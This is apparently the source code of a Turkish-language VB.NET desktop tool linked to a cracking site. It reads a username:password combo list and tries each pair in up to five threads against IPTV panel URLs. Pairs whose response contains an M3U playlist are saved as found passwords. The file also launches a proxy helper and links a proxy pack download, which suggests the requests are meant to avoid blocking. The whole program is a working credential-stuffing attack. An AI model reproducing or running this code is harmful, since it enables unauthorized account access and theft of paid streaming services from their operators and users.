Imports System.IO
Imports System.Net.Mail
Imports System.Threading
Public Class Form2
    Dim Red As Integer = 150
    Dim Green As Integer = 150
    Dim Blue As Integer = 200
    Dim x As Integer
    Dim sr As Integer
    Dim cs As Integer
    Dim sw As New Stopwatch()
    Dim Talep As System.Net.HttpWebRequest
    Dim Cevap As System.Net.HttpWebResponse
    Dim Okuyucu As System.IO.StreamReader
    Dim Kaynakkodu As String
    Dim toplam, iii As Integer
    Dim thread As System.Threading.Thread
    Dim thread2 As System.Threading.Thread
    Dim thread3 As System.Threading.Thread
    Dim thread4 As System.Threading.Thread
    Dim thread5 As System.Threading.Thread
    Dim thread6 As System.Threading.Thread
    Dim thread7 As System.Threading.Thread
    Dim deger As Integer
    Dim oku As IO.StreamReader
    Dim op As New OpenFileDialog

    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        'Try
        'Shell("TASKKILL /F /IM vlc.exe")
        'Catch
        'End Try
    End Sub


    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Timer1.Start()
        Timer2.Stop()
        TextBox29.Visible = False
        Try
            If cs > 0 Then
                ' sw.Reset()
                '  sw.Start()
                Button1.Enabled = False
                Button2.Enabled = False
                Button3.Enabled = True
                Button8.Enabled = True
                Button9.Enabled = True
                If RadioButton3.Checked = True Then
                    RadioButton4.Enabled = False
                    RadioButton5.Enabled = False

                    ' Label5.Text = ""
                    ListBox1.Items.Clear()
                    x = 1

                    thread = New System.Threading.Thread(AddressOf countup)
                    ' thread.Priority = ThreadPriority.AboveNormal
                    thread.Start()
                    Label6.Location = New Point(194, 200)

                ElseIf RadioButton4.Checked = True Then
                    Label6.Location = New Point(194, 160)
                    RadioButton3.Enabled = False
                    RadioButton5.Enabled = False

                    ' Label5.Text = ""
                    ListBox1.Items.Clear()

                    x = 2

                    ' cs = cs / 2
                    thread = New System.Threading.Thread(AddressOf countup)
                    thread.Start()
                    thread2 = New System.Threading.Thread(AddressOf countup2)
                    thread2.Start()
                ElseIf RadioButton5.Checked = True Then
                    Label6.Location = New Point(194, 184)
                    RadioButton3.Enabled = False
                    RadioButton4.Enabled = False

                    x = 5

                    ' cs = cs / 5
                    ListBox1.Items.Clear()
                    ' Label5.Text = ""
                    thread = New System.Threading.Thread(AddressOf countup)
                    thread.Start()
                    thread2 = New System.Threading.Thread(AddressOf countup2)
                    thread2.Priority = ThreadPriority.AboveNormal
                    thread2.Start()
                    thread3 = New System.Threading.Thread(AddressOf countup3)
                    thread3.Start()
                    thread4 = New System.Threading.Thread(AddressOf countup4)
                    thread4.Priority = ThreadPriority.AboveNormal
                    thread4.Start()
                    thread5 = New System.Threading.Thread(AddressOf countup5)
                    thread5.Start()
                End If
            Else
                Label3.ForeColor = Color.FromArgb(255, 0, 0)
                Label3.Location = New Point(299, 94)
                Label3.Text = "Önce combo yükleyiniz !!!"
            End If
        Catch
        End Try
    End Sub

    Private Sub Button8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button8.Click
        Timer2.Stop()
        TextBox29.Visible = True
        Try
            If sr > 0 Then


                Button2.Enabled = False
                If RadioButton3.Checked = True Then
                    Label3.Location = New Point(299, 94)
                    Label3.ForeColor = Color.FromArgb(0, 170, 220)
                    Label3.Text = "Tarama Duraklatıldı"
                    thread.Suspend()
                    ListBox1.Enabled = True
                    TextBox1.Enabled = True
                ElseIf RadioButton4.Checked = True Then
                    Label3.Location = New Point(299, 94)
                    Label3.ForeColor = Color.FromArgb(0, 170, 220)
                    Label3.Text = "Tarama Duraklatıldı"
                    thread.Suspend()
                    thread2.Suspend()
                    ListBox1.Enabled = True
                    TextBox1.Enabled = True

                ElseIf RadioButton5.Checked = True Then
                    Label3.Location = New Point(299, 94)
                    Label3.ForeColor = Color.FromArgb(0, 170, 220)
                    Label3.Text = "Tarama Duraklatıldı"
                    thread.Suspend()
                    thread2.Suspend()
                    thread3.Suspend()
                    thread4.Suspend()
                    thread5.Suspend()
                    ListBox1.Enabled = True
                    TextBox1.Enabled = True

                End If

                If ListBox1.Items.Count.ToString() <> 0 Then
                    TextBox1.Enabled = True
                    Button3.Enabled = True
                    Button5.Enabled = True
                    ListBox1.Enabled = True
                End If

            Else
                Label3.ForeColor = Color.FromArgb(255, 0, 0)
                Label3.Location = New Point(299, 94)
                Label3.Text = "Duraklama için önce başlatmalısınız !!!"
            End If

        Catch
        End Try

    End Sub

    Private Sub Button9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button9.Click
        Timer2.Stop()
        TextBox29.Visible = False
        Try

            If sr > 0 Then




                Button2.Enabled = False
                If RadioButton3.Checked = True Then

                    Label3.ForeColor = Color.FromArgb(0, 191, 255)
                    Label3.Location = New Point(299, 94)
                    Label3.Text = "Tarama devam ettirildi"
                    thread.Resume()
                    ListBox1.Enabled = False
                    TextBox1.Enabled = False
                ElseIf RadioButton4.Checked = True Then
                    Label3.ForeColor = Color.FromArgb(0, 191, 255)
                    Label3.Location = New Point(299, 94)
                    Label3.Text = "Tarama devam ettirildi"
                    thread.Resume()
                    thread2.Resume()
                    ListBox1.Enabled = False
                    TextBox1.Enabled = False

                ElseIf RadioButton5.Checked = True Then
                    Label3.ForeColor = Color.FromArgb(0, 191, 255)
                    Label3.Location = New Point(299, 94)
                    Label3.Text = "Tarama devam ettirildi"
                    thread.Resume()
                    thread2.Resume()
                    thread3.Resume()
                    thread4.Resume()
                    thread5.Resume()
                    ListBox1.Enabled = False
                    TextBox1.Enabled = False

                End If
            Else
                Label3.ForeColor = Color.FromArgb(255, 0, 0)
                Label3.Location = New Point(299, 94)
                Label3.Text = "Başlamayan bir olay devam ettirilemez !!!"
            End If


        Catch
        End Try

    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Timer2.Stop()
        TextBox29.Visible = True
        Try
            If sr > 0 Then

                Button1.Enabled = False
                Button2.Enabled = False
                Button8.Enabled = False
                Button9.Enabled = False

                If RadioButton3.Checked = True Then
                    ClearAll(Me)
                    Label3.ForeColor = Color.FromArgb(255, 0, 0)
                    Label3.Location = New Point(299, 94)
                    Label3.Text = "Tarama sona erdirildi"
                    thread.Abort()
                    RadioButton3.Enabled = True
                    RadioButton4.Enabled = True
                    RadioButton5.Enabled = True
                    ListBox1.Enabled = True

                ElseIf RadioButton4.Checked = True Then
                    Label3.ForeColor = Color.FromArgb(255, 0, 0)
                    Label3.Location = New Point(299, 94)
                    Label3.Text = "Tarama sona erdirildi"
                    thread.Abort()
                    thread2.Abort()
                    RadioButton3.Enabled = True
                    RadioButton4.Enabled = True
                    RadioButton5.Enabled = True
                    ListBox1.Enabled = True
                    ClearAll(Me)
                ElseIf RadioButton5.Checked = True Then
                    Label3.ForeColor = Color.FromArgb(255, 0, 0)
                    Label3.Location = New Point(299, 94)
                    Label3.Text = "Tarama sona erdirildi"
                    thread.Abort()
                    thread2.Abort()
                    thread3.Abort()
                    thread4.Abort()
                    thread5.Abort()
                    RadioButton3.Enabled = True
                    RadioButton4.Enabled = True
                    RadioButton5.Enabled = True
                    ListBox1.Enabled = True

                    ClearAll(Me)
                End If
                If ListBox1.Items.Count.ToString() <> 0 Then
                    TextBox1.Enabled = True
                    Button3.Enabled = False
                    Button5.Enabled = True
                    ListBox1.Enabled = True
                End If
            Else
                Label3.ForeColor = Color.FromArgb(255, 0, 0)
                Label3.Location = New Point(299, 94)
                Label3.Text = "Önce taramayı başlatınız !!!"
            End If

        Catch
        End Try
        Button2.Enabled = True
        RadioButton3.Enabled = True
        RadioButton4.Enabled = True
        RadioButton5.Enabled = True
        Button1.Enabled = True
    End Sub

    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Try
            If ListBox1.SelectedIndex <> -1 Then
                System.Diagnostics.Process.Start("C:\Program Files(x86)VideoLAN\VLC\vlc.exe", (ListBox1.SelectedItem))
            Else
                TextBox44.Text = "Listeden Seçim Yapınız"
            End If
        Catch
        End Try
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Try


            Button5.Enabled = False
            TextBox2.Clear()
            TextBox3.Clear()
            TextBox4.Clear()
            TextBox5.Clear()
            TextBox6.Clear()
            TextBox7.Clear()
            'TextBox8.Clear()
            Label6.Text = ""
            TextBox23.Text = 0
            TextBox24.Text = 0
            TextBox25.Text = 0
            TextBox26.Text = 0
            TextBox27.Text = 0


            TextBox43.Clear()
            TextBox44.Clear()
            TextBox45.Clear()
            TextBox46.Clear()
            TextBox47.Clear()
            TextBox48.Clear()
            Label3.Text = ""
            ListBox1.Items.Clear()
            ListBox1.Enabled = False
            sr = 0
            cs = 0
            If op.ShowDialog = DialogResult.OK Then
                '  Dim oku As IO.StreamReader
                '  oku = IO.File.OpenText(op.FileName)
                Dim st As New StreamReader(op.FileName)


                cs = 0
                While st.Read() > 0
                    st.ReadLine()
                    cs += 1
                End While
                Label9.Text = cs
            End If
            If RadioButton1.Checked = True Then
                TextBox43.Text = TextBox1.Text & "/get.php?username=$&password=#&type=m3u"
            Else
                TextBox43.Text = TextBox1.Text + "/playlist?type=m3u&deviceUser=$&devicePass=#"
            End If
            Button2.Enabled = True

        Catch
        End Try
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        Try
            If ListBox1.Items.Count <> 0 Then
                Kaydet()

            Else
                MsgBox("Kaydedilecek Hiç Bir Şey YOK!", MsgBoxStyle.Critical, "HATA!")
            End If
        Catch
        End Try
    End Sub
    Private Sub ListBox1_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ListBox1.SelectedIndexChanged
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        For Fadein = 0.0 To 1.1 Step 0.1
            Me.Opacity = Fadein
            Me.Refresh()
            Threading.Thread.Sleep(100)
        Next
        Dim spy As New System.Net.WebClient
        Label18.Text = System.IO.Path.GetDirectoryName(Application.ExecutablePath)
        Timer2.Start()
        Timer1.Start()
        Timer3.Start()
        TextBox29.Text = System.Text.Encoding.ASCII.GetString(spy.DownloadData("https://dl.dropbox.com/s/thzom0uwm44isyd/duyuru.txt"))
    End Sub
    Private Sub countup5()
        Try

            Control.CheckForIllegalCrossThreadCalls = False

            Label3.ForeColor = Color.FromArgb(0, 191, 255)
            Label3.Location = New Point(299, 94)
            Label3.Text = "Arama işlemi başlatıldı !!!"

            Dim data4 = File.ReadAllLines(op.FileName).Where(Function(f, i) i Mod x = 4)
            Dim s As Integer
            For s = 0 To data4.Count - 1

            Next
            TextBox27.Text = s

            For Each i0 As String In data4

                ' sw.Start()
                ' TextBox7.Text = i0
                Label6.Text = i0
                sr = sr + 1
                TextBox27.Text = TextBox27.Lines.Count
                Try




                    Dim parcalar4 As String()

                    parcalar4 = i0.Split(":")
                    TextBox48.Text = (TextBox43.Text.Replace("$", parcalar4(0)))
                    TextBox48.Text = (TextBox48.Text.Replace("#", parcalar4(1)))



                    ' Refresh()

                    Dim siteler4() As String = {TextBox48.Text}
                    For Each ii0 As String In siteler4
                        s = s - 1
                        TextBox27.Text = s
                        ProgressBar1.Maximum = cs
                        ProgressBar1.Value = sr
                        Dim Talep As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(TextBox48.Text)
                        Dim Cevap As System.Net.HttpWebResponse = Talep.GetResponse()
                        Dim Okuyucu As System.IO.StreamReader = New System.IO.StreamReader(Cevap.GetResponseStream())
                        Dim Kaynakkodu As String = Okuyucu.ReadToEnd
                        Dim aranan = InStr(Kaynakkodu, "#EXTM3U")


                        If aranan > 0 Then

                            If (ListBox1.Items.Contains(ii0)) Then
                            Else
                                If CheckBox1.Checked = True Then
                                    My.Computer.Audio.Play(My.Resources.ses, AudioPlayMode.Background)
                                Else
                                End If
                                ListBox1.Items.Add(ii0)

                            End If
                        End If
                    Next
                Catch
                End Try
            Next
            If TextBox23.Text = 0 And TextBox24.Text = 0 And TextBox25.Text = 0 And TextBox26.Text = 0 And TextBox27.Text = 0 Then

                If ListBox1.Items.Count.ToString() <> 0 Then
                    If ProgressBar1.Value <> cs Then

                    Else

                        Label3.ForeColor = Color.FromArgb(127, 255, 0)
                        Label3.Location = New Point(299, 94)
                        Label3.Text = "Arama işlemi Bitti !!    Şifre Bulundu "
                        TextBox1.Enabled = True
                        Button3.Enabled = False
                        Button8.Enabled = False
                        Button9.Enabled = False
                        Button5.Enabled = True
                        ListBox1.Enabled = True
                        Label6.Text = ""
                    End If
                    ' sw.[Stop]()
                    ' Label5.Text = Math.Floor(sw.ElapsedMilliseconds)
                Else
                    If ProgressBar1.Value <> cs Then

                    Else

                        Label3.ForeColor = Color.FromArgb(255, 0, 0)
                        Label3.Location = New Point(299, 94)
                        Label3.Text = "Arama işlemi Bitti !!    Eşleşme olmadı "
                        Button3.Enabled = False
                        Label6.Text = ""
                        '  sw.[Stop]()
                        ' Label5.Text = Math.Floor(sw.ElapsedMilliseconds)
                    End If

                End If
            End If
        Catch
        End Try
    End Sub
    Private Sub countup4()
        Try

            Control.CheckForIllegalCrossThreadCalls = False

            Label3.ForeColor = Color.FromArgb(0, 191, 255)
            Label3.Location = New Point(260, 130)
            Label3.Text = "Arama işlemi başlatıldı !!!"

            Dim data3 = File.ReadAllLines(op.FileName).Where(Function(f, i) i Mod x = 3)

            Dim s As Integer
            For s = 0 To data3.Count - 1

            Next
            TextBox26.Text = s



            For Each i0 As String In data3

                '  sw.Start()
                '   TextBox6.Text = i0
                Label6.Text = i0
                sr = sr + 1
                TextBox26.Text = TextBox26.Lines.Count
                Try




                    Dim parcalar3 As String()

                    parcalar3 = i0.Split(":")
                    TextBox47.Text = (TextBox43.Text.Replace("$", parcalar3(0)))
                    TextBox47.Text = (TextBox47.Text.Replace("#", parcalar3(1)))



                    ' Refresh()

                    Dim siteler3() As String = {TextBox47.Text}
                    For Each ii0 As String In siteler3
                        s = s - 1
                        TextBox26.Text = s
                        ProgressBar1.Maximum = cs
                        ProgressBar1.Value = sr
                        Dim Talep As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(TextBox47.Text)
                        Dim Cevap As System.Net.HttpWebResponse = Talep.GetResponse()
                        Dim Okuyucu As System.IO.StreamReader = New System.IO.StreamReader(Cevap.GetResponseStream())
                        Dim Kaynakkodu As String = Okuyucu.ReadToEnd
                        Dim aranan = InStr(Kaynakkodu, "#EXTM3U")


                        If aranan > 0 Then

                            If (ListBox1.Items.Contains(ii0)) Then
                            Else
                                If CheckBox1.Checked = True Then
                                    My.Computer.Audio.Play(My.Resources.ses, AudioPlayMode.Background)
                                Else
                                End If
                                ListBox1.Items.Add(ii0)

                            End If
                        End If
                    Next
                Catch
                End Try
            Next
            If TextBox23.Text = 0 And TextBox24.Text = 0 And TextBox25.Text = 0 And TextBox26.Text = 0 And TextBox27.Text = 0 Then

                If ListBox1.Items.Count.ToString() <> 0 Then
                    If ProgressBar1.Value <> cs Then

                    Else

                        Label3.ForeColor = Color.FromArgb(127, 255, 0)
                        Label3.Location = New Point(299, 94)
                        Label3.Text = "Arama işlemi Bitti !!    Şifre Bulundu "
                        TextBox1.Enabled = True
                        Button3.Enabled = False
                        Button8.Enabled = False
                        Button9.Enabled = False
                        Button5.Enabled = True
                        ListBox1.Enabled = True
                        Label6.Text = ""
                    End If

                    ' sw.[Stop]()
                    ' Label5.Text = Math.Floor(sw.ElapsedMilliseconds)
                Else
                    If ProgressBar1.Value <> cs Then

                    Else

                        Label3.ForeColor = Color.FromArgb(255, 0, 0)
                        Label3.Location = New Point(299, 94)
                        Label3.Text = "Arama işlemi Bitti !!    Eşleşme olmadı "
                        Button3.Enabled = False
                        Label6.Text = ""
                    End If

                    ' sw.[Stop]()
                    '  Label5.Text = Math.Floor(sw.ElapsedMilliseconds)
                End If
            End If
        Catch
        End Try
    End Sub
    Private Sub countup3()

        Try

            Control.CheckForIllegalCrossThreadCalls = False

            Label3.ForeColor = Color.FromArgb(0, 191, 255)
            Label3.Location = New Point(299, 94)
            Label3.Text = "Arama işlemi başlatıldı !!!"

            Dim data2 = File.ReadAllLines(op.FileName).Where(Function(f, i) i Mod x = 2)
            Dim s As Integer
            For s = 0 To data2.Count - 1

            Next
            TextBox25.Text = s

            For Each i0 As String In data2

                ' sw.Start()
                ' TextBox5.Text = i0
                Label6.Text = i0
                sr = sr + 1
                TextBox25.Text = TextBox25.Lines.Count
                Try
                    Dim parcalar2 As String()

                    parcalar2 = i0.Split(":")
                    TextBox46.Text = (TextBox43.Text.Replace("$", parcalar2(0)))
                    TextBox46.Text = (TextBox46.Text.Replace("#", parcalar2(1)))



                    '  Refresh()

                    Dim siteler2() As String = {TextBox46.Text}
                    For Each ii0 As String In siteler2
                        s = s - 1
                        TextBox25.Text = s
                        ProgressBar1.Maximum = cs
                        ProgressBar1.Value = sr
                        Dim Talep As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(TextBox46.Text)
                        Dim Cevap As System.Net.HttpWebResponse = Talep.GetResponse()
                        Dim Okuyucu As System.IO.StreamReader = New System.IO.StreamReader(Cevap.GetResponseStream())
                        Dim Kaynakkodu As String = Okuyucu.ReadToEnd
                        Dim aranan = InStr(Kaynakkodu, "#EXTM3U")


                        If aranan > 0 Then

                            If (ListBox1.Items.Contains(ii0)) Then
                            Else
                                If CheckBox1.Checked = True Then
                                    My.Computer.Audio.Play(My.Resources.ses, AudioPlayMode.Background)
                                Else
                                End If
                                ListBox1.Items.Add(ii0)

                            End If
                        End If
                    Next
                Catch
                End Try
            Next
            If TextBox23.Text = 0 And TextBox24.Text = 0 And TextBox25.Text = 0 And TextBox26.Text = 0 And TextBox27.Text = 0 Then

                If ListBox1.Items.Count.ToString() <> 0 Then
                    If ProgressBar1.Value <> cs Then

                    Else

                        Label3.ForeColor = Color.FromArgb(127, 255, 0)
                        Label3.Location = New Point(299, 94)
                        Label3.Text = "Arama işlemi Bitti !!    Şifre Bulundu "
                        TextBox1.Enabled = True
                        Button3.Enabled = False
                        Button8.Enabled = False
                        Button9.Enabled = False
                        Button5.Enabled = True
                        ListBox1.Enabled = True
                        Label6.Text = ""
                    End If

                    ' sw.[Stop]()
                    ' Label5.Text = Math.Floor(sw.ElapsedMilliseconds)
                Else
                    If ProgressBar1.Value <> cs Then

                    Else

                        Label3.ForeColor = Color.FromArgb(255, 0, 0)
                        Label3.Location = New Point(299, 94)
                        Label3.Text = "Arama işlemi Bitti !!    Eşleşme olmadı "
                        Button3.Enabled = False
                        Label6.Text = ""

                        ' sw.[Stop]()
                        'Label5.Text = Math.Floor(sw.ElapsedMilliseconds)
                    End If

                End If
            End If
        Catch
        End Try
    End Sub
    Private Sub countup2()
        Try

            Control.CheckForIllegalCrossThreadCalls = False
            Label9.Text = cs

            Label3.ForeColor = Color.FromArgb(0, 191, 255)
            Label3.Location = New Point(299, 94)
            Label3.Text = "Arama işlemi başlatıldı !!!"

            Dim data1 = File.ReadAllLines(op.FileName).Where(Function(f, i) i Mod x = 1)
            Dim s As Integer
            For s = 0 To data1.Count - 1

            Next
            TextBox24.Text = s
            For Each i0 As String In data1
                ' sw.Start()
                Label16.Text = i0
                sr = sr + 1

                TextBox24.Text = TextBox24.Lines.Count
                Try
                    Dim parcalar1 As String()
                    parcalar1 = i0.Split(":")
                    TextBox45.Text = (TextBox43.Text.Replace("$", parcalar1(0)))
                    TextBox45.Text = (TextBox45.Text.Replace("#", parcalar1(1)))
                    ' Refresh()

                    Dim siteler1() As String = {TextBox45.Text}
                    For Each ii0 As String In siteler1
                        s = s - 1
                        TextBox24.Text = s
                        ProgressBar1.Maximum = cs
                        ProgressBar1.Value = sr
                        Dim Talep As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(TextBox45.Text)
                        Dim Cevap As System.Net.HttpWebResponse = Talep.GetResponse()
                        Dim Okuyucu As System.IO.StreamReader = New System.IO.StreamReader(Cevap.GetResponseStream())
                        Dim Kaynakkodu As String = Okuyucu.ReadToEnd
                        Dim aranan = InStr(Kaynakkodu, "#EXTM3U")


                        If aranan > 0 Then

                            If (ListBox1.Items.Contains(ii0)) Then
                            Else
                                If CheckBox1.Checked = True Then
                                    My.Computer.Audio.Play(My.Resources.ses, AudioPlayMode.Background)
                                Else
                                End If
                                ListBox1.Items.Add(ii0)

                            End If
                        End If
                    Next
                Catch
                End Try
            Next
            If TextBox23.Text = 0 And TextBox24.Text = 0 And TextBox25.Text = 0 And TextBox26.Text = 0 And TextBox27.Text = 0 Then

                If ListBox1.Items.Count.ToString() <> 0 Then
                    If ProgressBar1.Value <> cs Then

                    Else
                        Label3.ForeColor = Color.FromArgb(127, 255, 0)
                        Label3.Location = New Point(299, 94)
                        Label3.Text = "Arama işlemi Bitti !!    Şifre Bulundu "

                        TextBox1.Enabled = True
                        Button3.Enabled = False
                        Button8.Enabled = False
                        Button9.Enabled = False
                        Button5.Enabled = True
                        ListBox1.Enabled = True
                        Label6.Text = ""
                    End If

                    ' sw.[Stop]()
                    ' Label5.Text = Math.Floor(sw.ElapsedMilliseconds)
                Else
                    If ProgressBar1.Value <> cs Then

                    Else

                        Label3.ForeColor = Color.FromArgb(255, 0, 0)
                        Label3.Location = New Point(299, 94)
                        Label3.Text = "Arama işlemi Bitti !!    Eşleşme olmadı "
                        Button3.Enabled = False
                        Label6.Text = ""

                        '    sw.[Stop]()
                        '  Label5.Text = Math.Floor(sw.ElapsedMilliseconds)
                    End If

                End If
            End If
        Catch
        End Try
    End Sub
    Private Sub countup()


        Try


            Control.CheckForIllegalCrossThreadCalls = False
            TextBox10.Visible = False
            Label3.ForeColor = Color.FromArgb(0, 191, 255)
            Label3.Location = New Point(299, 94)
            Label3.Text = "Arama işlemi başlatıldı !!!"

            Dim data = File.ReadAllLines(op.FileName).Where(Function(f, i) i Mod x = 0)
            Dim s As Integer
            For s = 0 To data.Count - 1

            Next
            TextBox23.Text = s
            For Each i0 As String In data

                'sw.Start()
                Label6.Text = i0
                sr = sr + 1

                Try

                    Dim parcalar As String()

                    parcalar = i0.Split(":")
                    TextBox2.Text = (TextBox43.Text.Replace("$", parcalar(0)))
                    TextBox2.Text = (TextBox2.Text.Replace("#", parcalar(1)))
                    ' Refresh()
                    Dim siteler() As String = {TextBox2.Text}

                    For Each ii0 As String In siteler
                        s = s - 1
                        TextBox23.Text = s
                        ProgressBar1.Maximum = cs
                        ProgressBar1.Value = sr
                        deger = CInt(sr) * 100 / cs
                        Label7.Text = deger


                        Label11.Text = sr
                        Label13.Text = cs - sr
                        Dim Talep As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(Trim(TextBox2.Text))
                        Dim Cevap As System.Net.HttpWebResponse = Talep.GetResponse()
                        Dim Okuyucu As System.IO.StreamReader = New System.IO.StreamReader(Cevap.GetResponseStream())
                        Dim Kaynakkodu As String = Okuyucu.ReadToEnd
                        Dim aranan = InStr(Kaynakkodu, "#EXTM3U")
                        If aranan > 0 Then

                            If (ListBox1.Items.Contains(ii0)) Then
                            Else
                                If CheckBox1.Checked = True Then
                                    My.Computer.Audio.Play(My.Resources.ses, AudioPlayMode.Background)
                                Else
                                End If
                                ListBox1.Items.Add(ii0)

                            End If
                        End If

                    Next
                Catch
                End Try
            Next
            If TextBox23.Text = 0 And TextBox24.Text = 0 And TextBox25.Text = 0 And TextBox26.Text = 0 And TextBox27.Text = 0 Then

                If ListBox1.Items.Count.ToString() <> 0 Then
                    If ProgressBar1.Value <> cs Then

                    Else


                        Label3.ForeColor = Color.FromArgb(127, 255, 0)
                        Label3.Location = New Point(299, 94)
                        Label3.Text = "Arama işlemi Bitti !!    Şifre Bulundu "

                        TextBox1.Enabled = True
                        Button3.Enabled = False
                        Button8.Enabled = False
                        Button9.Enabled = False
                        Button5.Enabled = True
                        ListBox1.Enabled = True

                        Label6.Text = ""
                        '  sw.[Stop]()
                        '  Label5.Text = Math.Floor(sw.ElapsedMilliseconds)
                    End If


                Else
                    If ProgressBar1.Value <> cs Then

                    Else
                        Label3.ForeColor = Color.FromArgb(255, 0, 0)
                        Label3.Location = New Point(299, 94)
                        Label3.Text = "Arama işlemi Bitti !!    Eşleşme olmadı "

                        Button3.Enabled = False
                        Label6.Text = ""

                        ' sw.[Stop]()
                        '  Label5.Text = Math.Floor(sw.ElapsedMilliseconds)
                    End If
                End If

            End If
        Catch
        End Try
    End Sub
    Public Sub Kaydet()
        Try
            Dim save As New SaveFileDialog()
            save.Title = "Dosyayı Kaydet"
            save.DefaultExt = "txt"
            save.Filter = "txt Dosyası (*.txt)|*.txt"
            save.ShowDialog()

            Dim DosyaKaydet As New StreamWriter(save.FileName)
            Dim i As Integer
            For i = 0 To ListBox1.Items.Count - 1

                DosyaKaydet.WriteLine(ListBox1.Items.Item(i))
                ' TextBox35.Text = TextBox35.Text & ListBox1.Items.Item(i) & vbCrLf
            Next
            DosyaKaydet.Close()
        Catch
        End Try

    End Sub
    Private Sub ClearAll(ByVal ctl As Control)
        Try
            For Each c As Control In ctl.Controls
                If TypeOf c Is TextBox Then
                    DirectCast(c, TextBox).Clear()
                End If
                If c.Controls.Count > 0 Then
                    ClearAll(c)
                End If
            Next
        Catch
        End Try
    End Sub
    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Dim spy As New System.Net.WebClient
        TextBox29.Text = System.Text.Encoding.ASCII.GetString(spy.DownloadData("https://dl.dropbox.com/s/thzom0uwm44isyd/duyuru.txt"))
    End Sub

    Private Sub PictureBox2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox2.Click
        Process.Start("http://CrackingStar.Org")
    End Sub
    Private Sub HuraButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HuraButton2.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub HuraButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HuraButton1.Click
        End
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs)
        Process.Start(Label18.Text + "\UberS Proxy For Panel Tarama.exe", "/pneltarama3162")
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Process.Start("https://dl.dropbox.com/s/eaqert2vu19zeg2/ProxyPack.rar")
    End Sub

    Private Sub Button4_Click_1(sender As Object, e As EventArgs) Handles Button4.Click
        Try
            Process.Start(Label18.Text + "\UberS Proxy For Panel Tarama.exe", "/pneltarama3162")
        Catch ex As Exception
            MsgBox("Proxy Pack Yüklü Değil! Yüklemek İçin Düğmenin Üstündeki Mavi Yazıya Tıklayın...", MsgBoxStyle.Critical, "HATA!")
        End Try
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        'HuraProgressBar1.Value = PerformanceCounter1.NextValue.ToString
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        Process.Start("http://UyduMeydani.Com")
    End Sub

    Private Sub TextBox29_TextChanged(sender As Object, e As EventArgs) Handles TextBox29.TextChanged

    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Giris.Hide()
    End Sub
End Class
